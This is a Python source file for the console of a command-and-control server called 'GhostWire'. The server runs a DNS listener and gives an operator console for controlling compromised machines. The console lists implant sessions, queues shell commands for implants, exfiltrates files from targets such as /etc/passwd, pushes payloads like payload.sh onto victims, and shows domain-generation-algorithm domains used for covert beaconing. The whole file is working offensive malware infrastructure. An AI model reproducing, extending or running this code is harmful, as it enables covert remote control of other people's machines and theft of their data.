"""
GhostWire C2 Server
====================
Main entry point. starts the DNS listener and provides
an operator console to manage sessions.
"""



import sys
import os
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from server.dns_listener import DNSListener
from shared.config import C2_DOMAIN, DNS_LISTEN_PORT, DB_PATH
from shared.logger import setup_logger, log_info, log_warning, log_error
from shared import database


def print_banner():
    print("""
   ██████╗ ███████╗██╗  ██╗   ██╗    ███████╗██╗    ██╗███████╗██████╗  ██████╗ ███████╗███████╗
  ██╔════╝ ██╔════╝██║  ╚██╗ ██╔╝    ██╔════╝██║    ██║██╔════╝██╔══██╗██╔════╝ ██╔════╝██╔════╝
  ██║  ███╗█████╗  ██║   ╚████╔╝     ███████╗██║ █╗ ██║█████╗  ██████╔╝██║  ███╗█████╗  █████╗  
  ██║   ██║██╔══╝  ██║    ╚██╔╝      ╚════██║██║███╗██║██╔══╝  ██╔══██╗██║   ██║██╔══╝  ██╔══╝  
  ╚██████╔╝███████╗███████╗██║       ███████║╚███╔███╔╝███████╗██║  ██║╚██████╔╝███████╗███████╗
  ╚══════╝ ╚══════╝╚══════╝╚═╝       ╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ╚══════╝ ╚══════╝╚══════╝
                                                                                    C2 Framework v0.1
    """)


def print_help():
    print("""
  Commands:
  ─────────────────────────────────────────────────────
  sessions                       - List active implant sessions
  cmd <id> <cmd>                 - Queue a command for an implant
  upload <id> <remote_path>      - Get a file FROM the target
  download <id> <local> <remote> - Send a file TO the target
  results <id>                   - Show results from an implant
  history <id>                   - Show full command/result history
  dga                            - Show current DGA domain
  help                           - Show this help menu
  quit                           - Stop server and exit
  ─────────────────────────────────────────────────────
    """)


def run_console(listener):
    print("[+] Type 'help' for a list of commands.\n")

    while True:
        try:
            cmd = input("GhostWire> ").strip()

            if not cmd:
                continue

            parts = cmd.split(maxsplit=3)
            action = parts[0].lower()

            # ─── sessions ───
            if action == "sessions":
                sessions = listener.get_resolver().list_sessions()
                if not sessions:
                    print("  [!] No active sessions.")
                else:
                    print(f"\n  {'ID':<12} {'IP':<18} {'Last Beacon':<12} {'Cmds':<6} {'Results':<8} {'Encrypted'}")
                    print(f"  {'─'*12} {'─'*18} {'─'*12} {'─'*6} {'─'*8} {'─'*9}")
                    for s in sessions:
                        enc_status = "🔒 Yes" if s['encrypted'] else "❌ No"
                        print(f"  {s['id']:<12} {s['ip']:<18} {s['last_beacon']:<12} {s['pending_cmds']:<6} {s['results']:<8} {enc_status}")
                    log_info(f"Operator listed sessions ({len(sessions)} active)")
                print()

            # ─── cmd <id> <command> ───
            elif action == "cmd":
                cmd_parts = cmd.split(maxsplit=2)
                if len(cmd_parts) < 3:
                    print("  [!] Usage: cmd <session_id> <command>")
                    print("  [!] Example: cmd a1b2c3d4 whoami\n")
                    continue
                session_id = cmd_parts[1]
                command = cmd_parts[2]
                listener.get_resolver().queue_command(session_id, command)
                log_info(f"Operator queued command '{command}' for session {session_id}")

            # ─── upload <id> <remote_path> ───
            elif action == "upload":
                if len(parts) < 3:
                    print("  [!] Usage: upload <session_id> <remote_path>")
                    print("  [!] Example: upload a1b2c3d4 /etc/passwd\n")
                    continue
                session_id = parts[1]
                remote_path = parts[2]
                listener.get_resolver().queue_upload(session_id, remote_path)
                log_info(f"Operator queued UPLOAD '{remote_path}' for session {session_id}")

            # ─── download <id> <local_path> <remote_path> ───
            elif action == "download":
                if len(parts) < 4:
                    print("  [!] Usage: download <session_id> <local_file> <remote_path>")
                    print("  [!] Example: download a1b2c3d4 ./payload.sh /tmp/payload.sh\n")
                    continue
                session_id = parts[1]
                local_path = parts[2]
                remote_path = parts[3]
                listener.get_resolver().queue_download(session_id, local_path, remote_path)
                log_info(f"Operator queued DOWNLOAD '{local_path}' -> '{remote_path}' for session {session_id}")

            # ─── results <id> ───
            elif action == "results":
                if len(parts) < 2:
                    print("  [!] Usage: results <session_id>\n")
                    continue
                session_id = parts[1]
                resolver = listener.get_resolver()
                if session_id in resolver.sessions:
                    results = resolver.sessions[session_id].results
                    if not results:
                        print("  [!] No results yet.\n")
                    else:
                        print(f"\n  Results for {session_id}:")
                        log_info(f"Operator viewed results for session {session_id}")
                        for i, result in enumerate(results):
                            print(f"  {i+1}. {result}")
                        print()
                else:
                    print(f"  [!] Unknown session: {session_id}\n")

            # ─── history <id> ───
            elif action == "history":
                if len(parts) < 2:
                    print("  [!] Usage: history <session_id>")
                    print("  [!] Shows full DB history (even closed sessions)\n")
                    continue
                session_id = parts[1]

                # Session info
                session = database.get_session(DB_PATH, session_id) if hasattr(database, 'get_session') else None
                # Use get_all_sessions and filter
                all_sessions = database.get_all_sessions(DB_PATH)
                session_info = None
                for s in all_sessions:
                    if s['session_id'] == session_id:
                        session_info = s
                        break

                if not session_info:
                    print(f"  [!] No history found for {session_id}\n")
                    continue

                print(f"\n  ─── Session {session_id} ───")
                log_info(f"Operator viewed history for session {session_id}")
                print(f"  IP:          {session_info['ip_address']}")
                print(f"  Registered:  {session_info['registered_at']}")
                print(f"  Last Beacon: {session_info['last_beacon']}")
                print(f"  Encrypted:   {'Yes' if session_info['encrypted'] else 'No'}")
                print(f"  Status:      {'Closed' if session_info['closed'] else 'Active'}")

                # Command history
                commands = database.get_command_history(DB_PATH, session_id)
                if commands:
                    print(f"\n  Commands:")
                    for c in commands:
                        status_icon = "✅" if c['status'] == 'completed' else "📤" if c['status'] == 'sent' else "⏳"
                        print(f"    {status_icon} {c['command']}  ({c['status']})  {c['queued_at'][:19]}")

                # Results
                results = database.get_results(DB_PATH, session_id)
                if results:
                    print(f"\n  Results:")
                    for r in results:
                        type_icon = "📤" if r['result_type'] == 'upload' else "📥" if r['result_type'] == 'download' else "💻"
                        data_preview = r['data'][:60] + "..." if len(r['data']) > 60 else r['data']
                        print(f"    {type_icon} [{r['result_type']}] {data_preview}  ({r['received_at'][:19]})")

                if not commands and not results:
                    print(f"\n  (no activity recorded)")

                print()

            # ─── dga ───
            elif action == "dga":
                dga = listener.get_resolver().dga
                all_domains = dga.generate_all()
                print(f"\n  [+] Current DGA domains:")
                for i, domain in enumerate(all_domains):
                    tag = "PRIMARY" if i == 0 else f"BACKUP {i}"
                    print(f"      [{tag}]  {domain}")
                print(f"\n  [+] Last 5 hours (primary domain):")
                past = dga.generate_past_labels(5)
                for label, time_str, full_domain in past[:5]:
                    print(f"      {time_str}  →  {full_domain}")
                print()

            # ─── help ───
            elif action == "help":
                print_help()

            # ─── quit ───
            elif action == "quit":
                print("\n [*] GhostWire: Till the next time...")
                log_info("Server shutdown requested by operator")
                listener.stop()
                print(" [*] Goodbye!\n")
                break

            # ─── unknown ───
            else:
                print(f" [!] Unknown command: {action}\n")
                log_warning(f"Unknown operator command entered: {action}")
                print("  [!] Type 'help' for commands.\n")

        except KeyboardInterrupt:
            print("\n\n  [*] Use 'quit' to exit properly.\n")
        except EOFError:
            print("\n  [*] Shutting down GhostWire...")
            listener.stop()
            break


def main():
    setup_logger()              # <-- INITIALIZE THE LOGGER FIRST
    log_info("GhostWire C2 Server starting")

    print_banner()
    listener = DNSListener()
    listener.start()
    run_console(listener)


if __name__ == "__main__":
    main()
